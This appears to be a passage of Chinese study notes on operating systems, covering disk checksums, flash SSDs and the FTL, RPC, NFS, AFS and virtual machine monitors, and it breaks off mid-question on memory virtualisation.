0.5% 0.05% 处理潜在的扇区错误 问题：文件系统应如何处理潜在扇区错误？需要增加什么额外的机制，来处理该类型的错误？ 当出现扇区错误时，还是很容易在第一时间发现问题的；因为文件系统尝试读取某个块，但由于该块所在的扇区不工作了，因此不能正常的返回需要的数据，此时文件系统就会发现扇区出现了错误； 接下来只需要使用已有的冗余机制，例如 RAID-1 的镜像备份，或者 RAID-4&#x2F;5 的校验和，来重建损坏的扇区即可； 对于 RAID-4&#x2F;5 来说，如果在多个磁盘上出现相同的扇区损坏，则无法重建成功了； 检测块错误：校验和块错误跟扇区错误不同，它是一种无声的故障，因为当故障发生时，磁盘并不会报错，而只是悄悄的返回了非预期的数据； 问题：需要什么技术来检测无声的错误？如何有效的实现？ 常见的校验和函数异或 XOR实现：假设最终的校验和是 4 字节的，则将整个块分成多个以 4 字节为单位的段，给每段相同位置的字节做异或计算； 优点：实现起来非常简单； 缺点：如果同个位置有两个字节处理错误，则异或计算的结果会显示正常，导致错误无法被发现； 加法实现：对整个数据块执行二进制补码的加法，忽略溢出；因此只要有任何一个位或多个位的数据出现变化，整个加法的结果都将不同； 优点：实现简单； 缺点：如果数据出现移位，而不是翻转，则无法检查出错误； Fletcher 校验和实现：假设数据块 D 由 d1 至 dn 共 n 个字节组成；有两个校验字节 s1 和 s2，其中 s1 &#x3D; s1 + di mod 255 s2 &#x3D; s2 + di mod 255 优点：可以检测所有单比特和双比特的错误，以及大部分的突发错误； 缺点：计算稍复杂 循环冗余检验 CRC CRC 全称：cycle redundancy check； 实现：将数据块 D 视为一个大的二进制数，并将其除以约定的值 k，得到的余数即是 CRC 值； 检验和布局最终计算出来的检验和，需要在磁盘上安排一个位置来存储它，有两种方法： 磁盘厂商实现将原本 512 字节的块，实际设置为 520 字节，这样多出来的 8 个字节刚好用来存储校验和； 文件系统实现单独划分一个 512 字节的块用来存储校验和，每个校验和为 8 字节，因此 512 字节的块可以存储 64 个检验和，刚好对应其后的 64 个连续的数据块；不过这种方法有很大的缺点：即当某个数据块的数据发生改变时，需要同时更新校验和所在的块，增加了寻道、定位等 I&#x2F;O 成本； 使用校验和 使用方法很简单，在读取某个数据块时，同时读取在磁盘上存储的检验和，并与根据数据块计算出来的校验和进行比较， 如果二者一致，就返回数据给用户； 如果不一致，如果有冗余机制，尝试进行恢复；如果没有，则报告错误； 错误的写入位置 问题：磁盘在写入数据时，有可能将数据写入到一个错误的地址上 为了应对该类故障，可以在校验和添加物理标识符，例如磁盘序号和块号； 丢失的写入 问题：磁盘报告它成功的将数据写入了，但实际上并没有； 这是一个很蛋疼的问题，当发生此类故障时，前面提到的所有校验机制都将无效，因为块上的旧数据符合上面的任意一条校验规则；一种解决办法是引入写入验证，例如写入后马上读取，但是 I&#x2F;O 成本很高； 其他方法是在磁盘上的某个位置添加额外的校验和，例如在 inode 和间接块中，存储数据块的检验和，这样如果某个数据块没有成功写入，那么数据块里面的数据是旧的，其校验和跟 inode 中存储的校验和将不一致； 有一种极端情况是连 inode 中的校验和的写入也丢失了，这样就没有办法检验了；不过貌似数据块和 inode 的写入同时丢失是一个小概率事件，当然，任何小概率事件早晚都是有可能发生的； 不定期擦拭虽然当文件被访问时，检验和将会被核对；但问题是绝大多数的文件在写入后，就很少被访问了；而由于磁盘本身的物理特性，在使用一段时间后，其上面的块可能会自行发生变化，此时将导致检验和出错；随着时间的推移，错误将累积得越来越多，最终导致当发现错误时，恢复工作已经无法进行； 为了避免这个问题，磁盘系统一般会定期对所有数据块进行扫描，以便及时发现错误和修复，保持它们始终是正确干净的状态； 校验和的开销由于每 4KB 的数据块需要一个 8 字节的校验和，因此整体空间开销在 0.2%，是一个可接受的范围，成本很小；但是计算开销则比较大，因为现在每访问一个数据块，都需要对其做校验和的计算和比对工作； 为了降低 CPU 开销，需要特别优化，将数据块的复制和校验，组合一个单独的简化活动；另外定期的擦净工作一般选择在夜间进行，此时电脑处于低工作荷载的状态中； 36.基于闪存的 SSD特点与构造闪存有一个很有意思的特点，它在内部将存储单元分为块和页（块比页大）；当需要写入数据到某个块时，首先需要先将整个块的数据先删除掉，之后才能写入；而且，写入的次数是有上限的；因此，如果对某个页执行频繁的写入操作，将导致其很快老化； 猜测之所以需要先删除，是因为需要让该块处于某种重置后的状态，在该状态下，块可以被放入电子；但是当电子放入后，就会破坏这种状态，导致无法再额外放入或取出电子；如果要写入新数据，则只能将整个块重新初始化； 问：如何构建闪存 SSD？如果应对昂贵的擦除成本？如果重写会缩短磁盘寿命的话，如果构建持久使用的磁盘？ 闪存的基本存储原理，是通过存储在晶体管中的电子数量，来判断该比特位所存储的值的； 单层：如果电子数量超过某个临界值，则表示 1；反之表示 0； 双层：有多个电子数量的临界点，分别表示 00、01、10、11； 三层：原理同双层相似，差别在于可以表示 3 个比特位，即 000 ~ 111； 虽然层数越多，单个存储单元的容量越大，单位价格越低，但是性能会下降；单层的单位容量小，但性能最好； 从位到片显然 SSD 存储器操作的最小单元不可能是比特，而是一个更大的存储单元“页”；SSD 一般由多块存储片构成，每个存储片中有 n 个块；每个块中有 n 个页； 块大小：128 ~- 256KB（相当于 32 ~ 64 个页） 页大小：512B ~ 4KB； 以块为单位的操作闪存芯片一般支持三个低级别的操作： 读取（页）：给定页编号即可，非常快，没有寻道成本，随机读取和顺序读取的性能几乎相同，约 10 微秒； 擦除（块）：将数据写入指定页前，需要将页所在的块上面的数据全面清除，之后才能写入（原因很简单：闪存是以存储单元中的电子量来表示值的，因此需要先将存储单元设置成某个初始化状态，之后才能够正确的放入电子）；擦除的成本比较高，需要约 1 毫秒（跟读取的速度相差 100 倍）； 写入（页）：当某个块被擦除后，就可以开始往里面的页写入数据了；写入的时间成本约 100 微秒； 写入过程根据页号找到所在的块，此时整个块的状态为 VALID（表示其上面的数据可读）； 将块的状态变更为 ERASED（此时块上所有页中的存储单元，都会被置为 1）； 根据页号，将某个页中存储单元的电子量设置为预期的状态（设置成功即表示数据写入成功），写入完成后，该页的状态会从 ERASED 变成 VALID； 问：好奇剩下的三个页仍为 ERASED 状态，那么未来再向它们写入数据时，它们会处于什么样的状态？是否需要重置整个块？ 答：貌似剩下的三个页下次可以直接往里面写入数据；只有当需要向已经是 VALID 的存储单元写入数据时，才需要将整个块重置为 ERASED 状态； 性能与可靠性老化闪存由于全部是硅晶体管构成的，没有传统磁盘中的机械结构，因此它出现故障的可能要比传统磁盘低一些（例如肯定不会出现磁头撞到盘面的情况）；闪存主要的问题是老化，因为每次向存储单元写入数据时，是往里面放入电子；每次清除其中的电子时，都会有一些残留；随着时间的推移，这些残留会累积；当累积到一定的程度后，就很难用该存储单元的电子数量来区分它当前是处于 0 还是 1 的状态了，这个时候该存储单元便不再可用了； 闪存生产商的数据是单层 SLC 的可擦写次数大约在 10 万次，双层 MLC 大约在 1 万次（但目前还不是非常确定，因为第三方的实验数据发现寿命好像比预想的还要更长一些）； 干扰另外一个会影响可靠性的点是干扰；当某个存储单元被读取或写入时，有可能会干扰旁边存储单元中的电子数量；当干扰超过某个临界点时，会造成位翻转，导致单元中存储的值不再准确； 从存储片到 SSD 在 SSD 出现之前，传统机械磁盘已经和文件系统形成了成熟的接口，因此 SSD 需要提供向后的兼容性， 以便能够让文件系统无感知的使用 SSD； 为了实现向后的兼容性，SSD 提供了一个中间的翻译层 FTL，Flash Translation Layer；它负责提供跟传统机械磁盘一样的接口，供文件系统调用，并将其翻译成内部指令； 为了提高性能，SSD 一般会将数据并行写在多个闪存存储芯片上（这点跟有多个盘面的机械硬盘其实是一样的）；另外需要降低写放大； 写放大 &#x3D; FTL 发给闪存芯片的指令数量 &#x2F; 文件系统发给 FTL 的指令数量 为了提高使用寿命，FTL 需要将数据尽可能均匀的写入到所有存储单元中，避免某些存储单元被写入的更多，导致过早老化； 为了减少写入干扰，FTL 通常会按页的顺序写入数据，从低页写到高页，避免无序写入，减少干扰几率； 实现 FTL 的最简单方式是使用直接映射，但是这会带来非常严重的问题，一是性能问题，因为写入页需要擦除块，因此会需要先复制块中的数据，之后再重新写入，这导致高昂的写入放大；二是寿命问题，文件的元数据不可避免会频繁更新，因此直接映射将导致某些存储单元也频繁更新，很快达到使用寿命的上限； 日志结构的 FTL文件系统中常用的日志结构刚好非常适合 FTL 的场景，每次更新数据的时候，都不覆盖旧的数据，而是在新的位置写入； 对于文件系统来说，哪些空间是空闲的，是由它自己在管理的，这意味着文件系统有自己的一套块编号系统，该系统与 SSD 内部的页编号并不相同，因此 SSD 内部还需要提供一张映射表，记录文件系统的块，对应自己内部的哪个页； 示例：文件系统的块 100、101、2000、2001，对应内部的页 0、1、2、3； 问题：SSD 需要将映射表存储在哪里？ 答：理论上猜测肯定是存储在 SSD 本身的存储单元里；对于日志结构策略来说，整个文件系统 imap 表是不断移动的，即随着数据更新，不断写入到最新的位置；而且单个文件的 inode 也会随着更新，不断在变化位置；数据块也是如此；只有当 inode 和数据块中的数据没有发生改变时，它们的位置才是固定的； 但是以上的分析是站在文件系统的角度，对于 SSD 来说，它还有额外的一个翻译映射层，即需要将文件系统的逻辑块，映射到自己的物理块地址；这个映射表是独立于文件系统的 imap、inode 之外的；它是对 inode 中读取到的指针的再次翻译好像？ 没错，而且有些 SSD 内部还有专门的 RAM 内存，用来在运行时加载该映射表，以提高翻译的速度；当然，有些 SSD 的策略是加载到主机的内存里，共享主机的内存，但由于不能无限占用主机的所有内存，肯定会设置一个上限；有可能这个上限小于整个映射表的大小，此时只能加载部分映射表到主机的内存中；由此当发生缓存不命中时，就需要先从闪存中读取未命中的映射数据，加载到内存里；这样的话， 对于主机来说，一条读取数据的指令，其实发生了两条从闪存中加载数据的指令，一次是加载映射表，一次是加载目标数据； 发现 SSD 内部的页表映射机制，跟 CPU 的虚拟内存地址映射是一毛一样的； 日志结构的 FTL 有两个缺点： 由于新数据总是写入新位置，而不是覆盖旧数据，这意味着旧位置的数据变成垃圾，需要定期清理，以便能够回收空间；但过度的垃圾回收会增加写放大和降低性能； 随着 SSD 容量的变大，SSD 内部需要越来越大的内存，以便能够存储映射表； 垃圾回收对于任何使用日志结构的系统来说，垃圾回收都将是不可避免的；当 SSD 决定运行垃圾回收时，它可以通过读取页中的块编号，并查询映射表，但相应的块编号指向的页编号是否匹配，如果不匹配，意味着该页已经变成了死页，或者叫垃圾页，可以进行回收；如果块中只有部分页是死页，部分页是活页，那么回收成本很高；因为 SSD 需要先将活页的数据复制出来，并写入到新的页中；为了降低回收成本，更好的办法是优先回收那些全部由死页构成的块，这样就不需要复制和写入数据了； 以上机制的成本仍然不低，因为需要扫描整个 SSD；由于文件系统本身也维护着空闲空间的管理，因此文件系统自己也清楚哪些逻辑块是垃圾块；SSD 可以通过提供一个额外的 trim 接口，让文件系统调用，告知哪些块可以释放，然后直接在 FTL 释放它们即可，少去了扫描的成本； 问：好奇 SSD 内部 FTL 如何管理自己的空闲空间？还是说直接不管理，交给文件系统来处理？万一有的文件系统没有这个功能呢？ 映射表尺寸块映射块映射是一种直接映射，目的是为了减少页表的大小时，因为如果按页进行直接映射的话，假设一条映射条目（页指针）需要占用 4 比特的空间，对应一个 4KB 的页；那么对于 1TB 的 SSD 来说，将需要 1GB 缓存以存储映射表，显然，这个映射成本太高了；如果换成使用块映射（块指针）的话，可以省下缓存空间，但是付出的代价是降低了性能，因为任何一个页的数据变更，都将导致整个块的迁移重写； 混合映射为了解决块映射的性能问题，FTL 引入了混合映射；它的策略是使用两个映射表，一个是日志表（负责页映射），一个数据表（负责块映射）；这样既能够得到页映射的性能，又能够得到块映射的空间； 当 FTL 收到文件系统的数据读取指令后，优先到页映射表中查找物理地址，如果找不到，再到块映射表中查询； 貌似优先到页映射表中查找，可以利用上局部性原理的好处； 当 FTL 收到文件系统的数据写入指令后，先将数据写入新的块，然后将新块的地址保存页映射表中；当某个新块中的页都按顺序被写满后，就把该块的地址迁移到块映射表中； 切换合并块中的页写满后，由原来的页映射切换为块映射； 部分合并假设出现了只有部分页被重写的情况，则 FTL 需要将未被重写的页，复制一份到新的块中；完成这个动作需要额外的 I&#x2F;O 操作，因此会导致一定的写放大； 完全合并假设某个日志块中的四个页，分别写入了四个不同的逻辑块的数据；当需要将它们从日志表迁移到数据表时，就需要做很多动作；需要读取每个逻辑块余下的页的数据，然后新建一个物理块，写入这些数据；同样的操作，每个逻辑块都需要做一遍，共做四遍； 页映射缓存由于混合映射过于复杂，另外一个解决方案是仍然使用页映射，但为其引入缓存机制（这个机制跟 CPU 中的虚拟内存地址映射缓存一毛一样）；其思路就是使用有效的缓存，来完成映射的工作；由于缓存有限，此时不再能将整个映射表一次加载到缓存中了，只能是部分加载（并且如果满了后，还需要剔除部分不常用的）；由于计算过程中必然存在的局部性，这种机制工作起来能够取得性能和成本的良好平衡； 减缓老化为了避免某个存储单元由于频繁擦写，导致过快出现老化， FTL 需要尽可能的将写入分摊到所有存储单元中；虽然日志写入策略，能够很好的实现分散化；但是电脑中的部分数据有可能在写入之后，就很被再次改写了，这样导致这些存储单元没有分摊到应尽的责任；为了避免这个问题， FTL 需要定期将这些不活跃的数据，迁移到其他存储单元，以便激活它们，承担更多的写入责任； 看来 FTL 还需要额外承担不时照看那些数据长期不更新的块，不定期把块中的数据迁移到其他写入次数比较多的块，以便可以利用这些数据长期不更新块的使用寿命； 性能和成本 SSD 的随机写入之所以比随机读取性能更好，其原因在于内部 FTL 使用的日志策略；该策略将随机写入在一定程度上转变成了顺序写入； 按理说机械硬盘也存在着相同的现象； 37.分布式系统分布式系统需要应对诸多方面的挑战，包括机器故障、数据包丢失、网络延迟、安全保障等； 通信常态不可靠的通信是网络中的常态，少数情况是由于电气原因引起的，多数是由于某个节点的缓冲区不足造成的；由于该节点在单位时间内收到了超过其本身内存可存储的数据包，迫使其必须丢弃一些后到的数据包，因此造成了丢包的现象； 问：既然丢包是网络中的常态，那应如何应对丢包的问题？ 答：从通信协议入手； 不可靠的通信层应对不可靠通信的方法之一是：不管它；因为对于某些应用程序来说，丢失一些数据包问题不大（例如视频类的应用）；或者其内部有其他应对丢包的方法（例如通过校验和确认完整性，当发现丢包时，要求对方重发）； 可靠的通信层构建可靠的通信涉及到四个动作： 确认的动作：acknowledgment，简称 ack；当接收方收到数据包后，发送一条 ack 消息给发送方，让发送方知悉数据包已经安全到达； 判断超时的动作：timeout；当发送方在一定的时间内，未收到接收方发回的 ack 消息，则判断数据包在传输的过程中丢失了； 重试的动作：当发送方判断数据包丢失后，重新发送一次数据包； 编号的动作：如果接收方发送的 ack 消息在路上丢失了，发送方会重新发送数据包；为了让接收方知悉收到了重复的数据包，双方就每次要发送的数据包进行顺序的编号；这样如果接收方收到相同编号的数据包，则只需要发回 ack 消息，而无须额外处理该数据包； 超时时间的设置是一个有意思的点，设得太小的话，发送方要消耗更多的 CPU 和带宽；设得太大的话，发送方提供的服务性能降低； 由于单个服务器经常对应多个客户端，因此有可能某个时间点，服务器会收到很多客户端的请求，导致过载；如果这些客户端都在一个固定的超时间隔后，再次发起重试的请求，将再次导致服务器过载，之后一直不断陷入死循环。为了避免这种情况发生，一般重试的时间间隔采用“指数倒退”的方案，即下一次重试的时间，是上一次的倍数，例如2倍； 分布式共享内存DSM，Distributed Shared Memory，它的构想是我台机器共享一个大的虚拟地址空间，当访问某个不在本地内存中的数据时，触发页错误，然后由操作系统调用网络通信，访问其他机器上面的数据； 这种分布式方案不是很有实用性，因为本地机器的优点在于 CPU 和快速的内存，现在将内存做成分布式的，反而自断长处了；更好的做法可能是将数据做成分布式的，将数据通过网络分发到多台机器上进行计算，最后再网络汇总各台机器的计算结果即可； 远程过程调用 RPCRPC，remote procedure call；其思路是像调用本地机器上的函数一样，调用远程机器上的代码并执行它；RPC 系统通常由两部分组成，存根生成器（stub generator）和运行时库（runtime）； 存根生成器既然是远程调用，不可避免涉及到与远程的机器进行通信，如果每个调用的应用程序，都需要自己处理这些通信的细节，既低效也容易出错。因此，所谓的存根生成器，其实就是对通信动作的抽象，让调用它的应用程序，可以不用关心底层的实现细节，像调用普通函数一样调用 RPC 即可； 好奇存根生成器跟普通的 HTTP 请求有什么本质上的区别？ 客户端存根生成器执行的动作： 创建缓冲区（申请一段内存空间）； 将消息放到缓冲区中：包括调用的函数 ID、函数参数、消息长度等； 将消息发送到 RPC 服务器上； 等待回复 收到回复，解包返回的数据，例如状态码、调用结果等； 返回结果给调用者； 服务端的存储生成器执行的动作； 解包客户端发过来的消息：提取函数 ID 和参数； 调用实际的函数； 打包结果，放入回复的缓冲区； 发送结果给客户端； 运行时库运行时库才是真正处理底层的脏活和累活，例如机器路由、传输协议等；它的职责是解决性能和可靠性的问题； 为了提高调用效率，运行时库一般构建在 UDP 协议上，然后将可靠性交给运行时库自己内部来处理；虽然 TCP 协议可以帮忙处理可靠性的问题，但由它处理的层级比较低，并不能取得最好的性能； 其他问题多久超时虽然设置了超时机制，但并不是万能的；因为有些远程调用本身确实需要很长的处理时间，如果一刀切的将它们判断为调用失败，并重新发送消息显然是不合适的；此时应该向服务端请求最新状态，如果对方回复仍在处理中，则应该继续保持等待； 超大参数有时传输的参数可能很大，此时运行时库需要提供消息的分组功能和重组功能； 不同字节序还有另外一个讨厌的问题是不同的机器可能使用不同字节序，有些使用大端法，有些使用小端法；因此，RPC 通常会在其消息体中明确标识当前消息内容所使用的字节序，以免对方弄错，并根据需要进行转换； 单台机器的故障概率是很小的，但是当一个系统是由几千台机器组成时，故障变成了大概率的事件；因此，如何正确有效的处理故障，则构建分布式系统的首要问题； 38. Sun 的网络文件系统（NFS） 如何构建共享文件系统？要考虑哪些问题？哪些点容易出错？ 基本分布式文件系统通常情况下，应用程序访问本地的文件系统来获取想要的持久性数据，对于分布式文件系统来说，应用程序改成访问客户端文件系统，它提供了一层抽象，接口仍然同普通的文件系统一样，所以对于应用程序来说，是透明无感知的； 开放协议最早的比较成功的分布式文件系统是 SUN 公司开发的 NFS，它通过制定协议的标准，引导行业人员采用该协议，并可以自行开发自己的 NFS 服务器，而不是限定只能使用 SUN 公司的版本，这种做法使用该协议迅速成为行业的标准； 目标：简单快速的崩溃恢复对于多客户端单服务器的场景来说，实现快速的崩溃恢复是非常重要的，因为在崩溃期间，客户端完全无法使用文件系统；NFSv2 采取的做法是使用无状态的协议，这使得服务器端无须管理客户端当前的状态，从而最大程度的降低崩溃恢复成本； 无状态与映射普通文件系统的系统调用是基于有状态的场景来设计的（例如使用文件描述符），如果想在客户端和服务器之间实现无状态的协议，就需要对原始的系统调用做一次封装；它们之间不可以是简单的 RPC，只是传递函数名称和参数，而是应该传递更多更完整的文件信息，包括卷标识、文件 inode 编号等；NFSv2 通过引入文件句柄来实现这一目的，每次通信，客户端都需将文件句柄传递给服务端，用来告知服务器自己想访问的是哪一个文件； 文件句柄：用来唯一标识服务端文件或目录的一种机制；它的思路其实很简单，本来文件系统上的各个文件原本就有唯一标识，现在将这些唯一标识的信息封闭成文件句柄的形式；这样当客户端给出某个文件句柄时，就能定位到某个具体的文件或目录；同时客户端会发送对这些文件的操作名称（即系统调用名称），服务端按要求进行操作即可； 世代号：一个新玩意，用来标识当前客户端读取的文件位置的状态； 虽然服务器端是无状态的，但是客户端的文件系统是有状态的；它会创建本地的文件描述符，来映射服务器返回的文件句柄，并且记录当前文件的位置，之后做为偏移量的参数，包含在请求中，发送给服务端； 客户端文件系统有维护一张映射表，映射每个路径下的文件和目录在服务端的对应句柄； 处理服务器故障通信故障是网络常态，因此客户端发出的请求有可能在中途丢失，另外服务器端也有可能处于崩溃重启的状态，无法正常响应客户端的请求；客户端通过超时重试的机制，来应对通信故障的场景； 对于大多数的只读操作来说，不管客户端发出几次相同的请求，最终得到的结果都是一样的（即这些操作具有幂等性）； 对于写操作来说，也是幂等的，因为在相同位置多次写入数据，最终得到的结果仍然是相同的； 对于创建目录的操作来说，则没有幂等性，因为如果目录已经存在了，则再次创建会返回失败的消息； 提高性能：缓存就像本地机器在将数据写入硬盘时，会使用缓存机制实现集中批量写入，以提高性能的做法一样 ，客户端文件系统与服务端之间，也可以引入缓存；让数据的读取和写入的性能更好； 缓存一致性问题当多个客户端都对同一份文件中的数据进行缓存时，就会出现缓存一致性的问题；因为有可能某个客户端在其缓存中更新了文件数据，但暂时未推送到服务器上面，则此时其他客户端看到的仍然是旧版本的数据； 貌似可以引入类似 git 的文件版本管理机制； NFS 通过两个机制来解决缓存一致性问题： 关闭时刷新：当客户端关闭某个文件后，出现缓存中有一些更新未推送到服务器，则将马上触发推送。以便其他客户端随后登录文件系统时，能够看到最新版本的数据； 打开时检查：当客户端访问某个文件时，如果发现本地已经有缓存，此时它会先向服务端发送一个请求，检查服务端的版本是否和本地缓存一致，如果不一致，则不使用缓存，而是从服务器拉取最新的版本； 客户端在检查本地文件缓存是否为最新版本时，需要设置一个检查的时间间隔，避免过于频繁的向服务器发起请求，不然服务端会收到大量的 GETATTR 请求，但实际上在大部分时间内，文件本身并没有什么变化； 服务端缓存的隐藏问题不止客户端会使用缓存机制，事实上服务器端的内存与硬盘的交互之间，也存在缓存机制，这会带来一个隐含的一致性问题；即如果服务端在收到某个客户端的写入请求后，并没有将数据立即写入持久性设备硬盘，而只是先写在了内存中，并向客户端报告已经成功写入；如果此时服务器发生崩溃，则未写入的数据将会丢失，但是客户端却误会以为已经成功了； 这个问题很棘手，并且不可避免，有两种常见的应对办法： 在服务端增加一个有备份电池的内存，这样即使服务端出现断电或崩溃，数据也不会丢失； 服务端使用专门为快速写入磁盘而设计的文件系统，以避免普通磁盘在处理立即写入时产生的性能问题； 39.Andrew 文件系统 AFSAFS 版本1版本一的设计思路是全文件缓存，即首次打开文件后，就将整个文件下载到本地磁盘，后续的读写操作都在本地运行，调用本地文件系统的接口即可，无需网络通信，性能很好；当文件关闭后，再将修改传输回服务器； 第二次打开文件时，会检查文件的本地版本和服务器版本是否一致，若一致，则直接使用本地副本，不再从服务端拉取； 存在的问题： 路径查找成本比较高：每个客户端发送一个请求，服务端都需要按完整的路径进行文件定位，消耗了很多服务器的CPU 时间； 类似 NFS，客户端发出很多版本检查的请求，占用了大量服务端的 CPU 和带宽； AFS 版本2针对版本1存在的问题，版本2引入了以下的解决方案： 反复查询状态问题：引入了回调机制，即文件版本是否变更，不再由客户端发起查询，而是由服务端来通知客户端（貌似这需要保持一个长连接，不然通知不到了）； 反复查找路径问题：引入文件标识符（FID，file Identifier，类似 NFS 中的文件句柄）来替代路径名；客户端在查找路径过程中，缓存结果在本地，这样下次查找，可以通过本地缓存找到路径对应的文件标识符，之后发送标识符到服务端即可，避免了服务端反复查找路径的问题（貌似借鉴了 NFS 中文件句柄的机制）； 注意：每次客户端从服务端获取一个文件或者目录时，都会在服务端建立一个回调，以便让文件或目录有变更，服务端可以通知客户端更新； 后来发现服务端的更新通知非常简单粗暴，只是中断回调而已，其他啥事也没有做；当客户端发现回调中断后，就到服务端重新拉取最新的版本； 缓存一致性更新可见性和缓存过期问题：当客户端关闭一个文件时，如果文件发生了变更，客户端就在第一时间将文件推送到了服务端；之后服务端会中断其他打开该文件客户端的回调；这样其他客户端就在第一时间知道了文件发生了更新，顺带解决了缓存过期问题； 当同一个客户端的不同进程，打开同一份文件时，由于本地缓存的存在，A 进程对文件的更新，对于 B 进程来说是实时可见的，因为它们都是访问的本地缓存，虽然此时服务端的版本可能是旧的，因为本地缓存的更新暂时还没有推送到服务端； 如果两个客户端同时修改一个文件，AFS 执行最后更新者胜出的策略，即以最后一个将更新推送到服务端的版本为准； 崩溃恢复崩溃有两种情况，一种是客户端崩溃，一种是服务端崩溃； 当客户端崩溃后，其原本和服务端建立的连接将失效，此时如果服务端的文件发生了变更，则服务端将无法通知客户端该变更；因此，客户端在崩溃恢复后，应该将本地的缓存视为可疑，重新和服务端建立连接，并确认版本是否有过期； 当服务端发生崩溃后，由于回调都存储在内存中，因此所有的回调将失效，服务端再也无法主动联系客户端并推送消息了；有两种办法可以解决该问题： 客户端定期检查与服务端的连接是否正常，如果发现服务端掉线，则立即将本地所有缓存标记为可疑，之后当访问本地缓存时，就跟服务端确认一下版本； 当客户端和服务端再次建立连接后，服务端主动告知客户端其本地缓存应该标记为可疑； 此处碰到的问题，都很像是使用 websocket 进行消息通知时会遇到的问题； 扩展性和性能优点： AFS 受益于在本地磁盘缓存整个文件内容，因此虽然大多数情况下，AFS 和 NFS 的性能差不多，但如果是机器重启后，对文件发起第二次的访问，则 AFS 将胜出，因为 NFS 没有本地磁盘副本，将需要再次通过网络下载文件，导致慢很多； AFS 另外一个优点是增加了扩展性，因为减少了很多请求的处理，单台服务器能够支持的客户端数量变得更多了； 缺点： 由于 NFS 缓存的是文件中的某个块，而不是整个文件，因此在某些场景下，它的性能将优于 AFS，即对文件中做出局部修改时，此时 NFS 可以只从服务端拉取对应的块即可，然后改写后推送到服务器；此时 AFS 需要先将整个文件从服务端下载下来，占用了很多时间；另外，改写完后，还需要将整个文件再推送回服务端，如果文件很大的话，速度将会很慢； 没有完美的系统，只有根据工作场景选择最匹配的系统； 貌似 AFS 的机制很像 github 的机制； 40.虚拟机管理程序 VMM：virtual machine monitor，虚拟机管理程序（hypervisor），它可以实现在现在的操作系统中，额外添加一层虚拟化； 用途 开发人员：方便在同一台机器上，实现不同 OS 下的代码调试和测试； 普通用户：方便在同一台机器上，使用不同 OS 下的应用程序； 运维人员：提高服务器的硬件资源使用率； 虚拟化 CPUVMM 的职责需要对安装在其上的虚拟操作系统模拟一切的硬件，包括 CPU、内存、磁盘等；对于普通操作系统，在启动的时候，它会将各种异常处理例程的地址，提前写入到硬件中，以便在发生异常时，硬件可以根据地址，找到异常处理程序来处理异常；对于 VMM 来说，当它启动一个虚拟操作系统时，它需要拦截虚拟操作系统发出的写入异常处理例程的指令，并记录下指令内部的异常处理程序地址； 由于 CPU 本身是受限直接执行的，因此很好奇 VMM 如何让虚拟 OS 在执行到特权指令后，能够陷入到自己的代码，而不是触发错误？猜测此处需要 CPU 的支持才行，即 CPU 必须支持除了内核模式和用户模式外的第三种甚至第四种模式，虚拟 OS 运行在这种模式中，并且在该模式下，虚拟 OS 发出的特权指令，会触发 VMM 已经提前在 CPU 中写好的自己的异常处理，然后接下来陷入 VMM 的代码，由 VMM 接管并处理虚拟 OS 发出的特权指令； 由于 CPU 对于内部程序来说是完全透明的，因此应用程序发出的全部是 CPU 可以直接解读和处理的指令集；当 VMM 监控到应用程序发出了系统调用时（如何实现监控？或许可以考虑让虚拟机的应用程序运行在某种特殊的用户模式下），里面其实包含一个触发异常的指令（正常情况下，执行该指令会陷入系统，即切换到操作系统提前指定的异常处理程序，并切换到内核模式）；当 VMM 发现应用程序发出这种指令时，VMM 就拦截它，并替换成之前记录的虚拟 OS 的异常处理程序的地址；CPU 根据该地址，读取内存中对应的异常处理程序，开始处理应用程序发出的系统调用； 由于虚拟 OS 内部的应用程序也是受限直接执行的，因此当它发出系统调用时，它也应该是要触发 VMM 在 CPU 中提前写入的异常处理程序，让其陷入 VMM 的代码，由 VMM 来接管应用程序发出的系统调用，而不是由陷入主机的 OS 进行处理； 不同虚拟 OS 之间的切换VMM 有可能同时管理着多个虚拟 OS，当想实现不同的虚拟 OS 之间的切换时，VMM 需要记下每个虚拟 OS 的状态，包括各个寄存器、程序计数器（PC）的值等；切换时，VMM 就把这些值写入到 CPU 中的寄存器和 PC 中，这样就实现切换了； 通过时间分片，CPU 定期陷入到内核模式中，执行 OS 的代码指令；好奇在 VMM 下，由于 VMM 只是一个普通的应用程序，它如何确保分配到足够多的时间片，来运行其中的虚拟 OS 的虚拟应用程序？还是说，这些虚拟的东西加在一起，能够分配到的时间片，只是跟主机上面的应用程序的比例是一样的？ 普通 OS 下的应用程序实现系统调用在普通的 OS 环境中，当应用程序想要执行某个系统调用时，它提前先将各项参数准备好，写入寄存器中，然后执行约定好的特殊指令；CPU 在收到这条特殊指令后，找到之前 OS 给它的该特殊指令的映射地址，写入程序计数器，并更新状态为内核模式，接下来舞台就交给 OS 了； VMM 必须拦截虚拟 OS 的特权操作VMM 不可能让虚拟 OS 实现特权操作，因为 VMM 本身也只是一个普通进程，并没有权限去帮忙虚拟 OS 实现任何的特权操作，因此它必须想办法拦截虚拟 OS 发出的各种特权操作，不然如果直接让指令进入 CPU ，会触发异常，并导致程序终止； 问：如何拦截呢？有一个办法是当虚拟 OS 尝试执行特权操作时，就让它陷入 VMM 中；这样 VMM 就有机会记录到特权操作的内容，知道某个虚拟 OS 的异常处理程序，在内存中的地址；有了这个地址后，VMM 之后就可以扮演成一个硬件的角色； 那如何让虚拟 OS 的特权操作能够陷入到 VMM 中呢？暂时想到的一种办法是让虚拟 OS 运行在某种特定的内核模式下，在该模式下的特权操作，会陷入 VMM 中； VMM 必须拦截虚拟应用程序的系统调用在普通 OS 下，应用程序的系统调用，会交给 OS 处理；由于 CPU 虚拟化使用的是受限直接执行的技术，因此 VMM 也必须拦截虚拟环境中的应用程序发出的系统调用，不能让它触发 CPU 中的主机 OS 的异常处理程序 问：如果主机的 OS 和虚拟 OS 版本一样的话，说不定也可以，即虽然操作不正确，但结果可能正确？不过这样做貌似很危险，因为虚拟应用程序在主机 OS 和虚拟 OS 的进程表中的代号并不相同，因此应该并不可行； 内存保护对于虚拟 OS 中的应用程序来说，需要限制其访问虚拟 OS 的数据，但是此时虚拟 OS 本身也是一个普通的应用程序，它的数据并不是存储在内核段中的；有两种办法可以解决这个问题： 额外的内核模式：MIPS 硬件提供了额外的管理员模式，可以让虚拟 OS 存放自己的数据，这些数据对普通应用程序不可访问； 内存保护：VMM 使用页表保护，让虚拟 OS 的数据仅对 OS 可用，对虚拟应用程序则不可访问；（当虚拟应用程序尝试访问虚拟 OS 的数据时，让其陷入 VMM，然后 VMM 检查地址是否合法） 虚拟化内存虚拟化方式 问题：VMM 如何虚拟化内存？ 答：莫非 VMM 